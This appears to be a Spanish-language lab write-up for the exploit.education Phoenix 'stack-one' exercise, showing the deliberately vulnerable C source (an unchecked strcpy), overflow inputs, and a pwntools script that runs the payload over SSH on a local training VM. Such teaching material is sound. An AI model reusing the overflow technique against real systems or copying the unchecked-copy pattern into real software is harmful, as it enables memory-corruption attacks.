---
layout: single
title: "stack-zero"
permalink: /pwn/phoenix/stack-zero/
parent: Phoenix
comments: true
excerpt: "stack-zero"
classes: wide
header:
  teaser: /assets/images/2025-08-17-Phoenix/logo.jpg
categories: [PWN]
tags: [PWN, Linux, Hacking, Easy]
---


# stack-one

Este nivel analiza el concepto de modificar variables a valores específicos en el programa y cómo se disponen las variables en la memoria.

Este nivel se puede encontrar en /opt/phoenix/<architecture>/stack-one

**Consejos:**

- `man ascii` Puedo decirte cuáles son los caracteres hexadecimales.
- ¿Tiene problemas? ¿Cómo funciona el [endianidad](https://en.wikipedia.org/wiki/Endianness) ¿De la arquitectura afecta el diseño de cómo se disponen las variables?

```c
/*
 * phoenix/stack-one, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x496c5962
 *
 * Did you hear about the kid napping at the local school?
 * It's okay, they woke up.
 *
 */

#include <err.h>    // Biblioteca para funciones de manejo de errores
#include <stdio.h>  // Biblioteca estándar para entrada/salida
#include <stdlib.h> // Biblioteca para funciones generales, como exit()
#include <string.h> // Biblioteca para funciones de manipulación de cadenas
#include <unistd.h> // Biblioteca para funciones del sistema POSIX, como sleep()

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
// Define un mensaje constante que se mostrará al inicio del programa

int main(int argc, char **argv) { 
  // Punto de entrada del programa principal. Toma el número de argumentos y sus valores.

  struct { 
    char buffer[64];          // Define un espacio de memoria para una cadena de 64 bytes.
    volatile int changeme;    // Variable marcada como "volatile", para evitar optimizaciones. Su valor debe ser cambiado por el exploit.
  } locals;                   // Crea una estructura llamada 'locals' que agrupa las dos variables.

  printf("%s\n", BANNER); 
  // Imprime el mensaje de bienvenida almacenado en la constante BANNER.

  if (argc < 2) { 
    // Verifica que el usuario haya proporcionado al menos un argumento al programa.
    errx(1, "specify an argument, to be copied into the \"buffer\"");
    // Si no se proporciona un argumento, muestra un mensaje de error y finaliza el programa con el código de salida 1.
  }

  locals.changeme = 0; 
  // Inicializa la variable 'changeme' con el valor 0.

  strcpy(locals.buffer, argv[1]); 
  // Copia el argumento proporcionado (argv[1]) en el buffer 'buffer'.
  // Vulnerabilidad: No se verifica el tamaño del argumento, lo que puede provocar un desbordamiento de búfer.

  if (locals.changeme == 0x496c5962) { 
    // Comprueba si el valor de 'changeme' coincide con el objetivo: 0x496c5962.
    puts("Well done, you have successfully set changeme to the correct value");
    // Si el valor es correcto, imprime un mensaje de éxito.
  } else { 
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
    // Si el valor es incorrecto, imprime el valor actual de 'changeme' y el valor esperado.
  }

  exit(0); 
  // Finaliza el programa correctamente con el código de salida 0.
}

```

Se corre el programa y como se ve en el código se le debe pasar un parámetro

```c
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one 
Welcome to phoenix/stack-one, brought to you by https://exploit.education
stack-one: specify an argument, to be copied into the "buffer"
```

al poner un valor como A nos devuelve que cada vez más cerca y nos da el valor de 0x00000000

```c
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one A
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00000000, we want 0x496c5962

```

Al poner los 64 caracteres como en el pasado y despues seguir con BBBB nos dice el mismo mensaje pero ahora se ha cambiado el valor por 0x42424242 lo cual quiere decir que ya cambiamos el valor 

```c
user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print "A"*64'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x42424242, we want 0x496c5962

```

ahora vamos a poner el valor esperado y vemos que se cumple con el reto

```c
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one $(python -c 'print "A" * 64 + "\x62\x59\x6c\x49"')
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

Se realiza el exploit para este reto

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/1_stack-one]
└─# cat Remote_exploit.py 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Remote_exploit.py
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/usr/bin/env python3
   2   │ from pwn import *
   3   │ 
   4   │ # Define el payload
   5   │ payload = b"A" * 64 + b"\x62\x59\x6c\x49"
   6   │ 
   7   │ # Establece conexión SSH
   8   │ ssh_connection = ssh(user='user', host='localhost', password='user', port=2222)
   9   │ 
  10   │ #  Ejecuta el programa remoto con la primera condición
  11   │ process = ssh_connection.process(['/opt/phoenix/amd64/stack-one', payload])
  12   │ 
  13   │ # Captura y muestra la salida
  14   │ flag = process.recvall().decode()
  15   │ log.success("Output: " + flag)
  16   │ 
  17   │ # Cierra la conexión
  18   │ process.close()
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────
```

Se evidencia el mensaje que indica que el reto fue completado

```c
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/1_stack-one]
└─# python3 Remote_exploit.py 
[+] Connecting to localhost on port 2222: Done
[*] user@localhost:
    Distro    Unknown 
    OS:       linux
    Arch:     amd64
    Version:  4.9.0
    ASLR:     Disabled
    SHSTK:    Disabled
    IBT:      Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Starting remote process None on localhost: pid 554
[!] ASLR is disabled for '/opt/phoenix/amd64/stack-one'!
[+] Receiving all data: Done (141B)
[*] Stopped remote process 'stack-one' on localhost (pid 554)
[+] Output: Welcome to phoenix/stack-one, brought to you by https://exploit.education
    Well done, you have successfully set changeme to the correct value

```